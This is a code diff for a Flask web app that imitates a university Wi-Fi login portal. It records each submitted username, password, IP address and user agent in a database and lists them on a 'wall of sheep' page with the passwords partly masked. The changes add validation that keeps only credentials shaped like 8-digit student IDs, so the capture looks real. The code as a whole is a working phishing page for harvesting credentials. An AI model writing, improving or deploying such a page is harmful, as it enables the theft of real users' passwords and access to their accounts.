@@ -34,16 +34,18 @@ class Wifi(db.Model):
 def login():
     if request.method == 'POST':
         post_data = request.form.to_dict()
-        if post_data and len(post_data['username']) > 5 and post_data['password'] > 5:
+        if check_data(post_data):
             data = Wifi()
-            data.remote_user = request.remote_user
+            data.remote_user = request.user_agent.string
             data.remote_addr = request.remote_addr
             data.username = post_data['username']
             data.password = post_data['password']
             data.create_time = datetime.datetime.now()
             db.session.add(data)
             db.session.commit()
+            # return render_template('bjtu_wifi_old_fail.html')
 
+    # return render_template('bjtu_wifi_new_pc.htm')
     return render_template('bjtu_wifi_old.html')
 
 
@@ -54,7 +56,21 @@ def handle404(e):
 
 @app.route('/sheep')
 def sheep():
-    data = Wifi.query.all()
+    data = Wifi.query.order_by(Wifi.create_time.desc()).all()
     for each in data:
         each.password = each.password[0] + ''.join(['*' for i in range(len(each.password) - 2)]) + each.password[-1]
     return render_template('wall_of_sheep.html', data=data)
+
+
+def check_data(data):
+    if not data or 'username' not in data or 'password' not in data:
+        return False
+    if len(data['username']) != 8:
+        return False
+    if len(data['password']) < 6:
+        return False
+    try:
+        int(data['username'])
+    except:
+        return False
+    return True
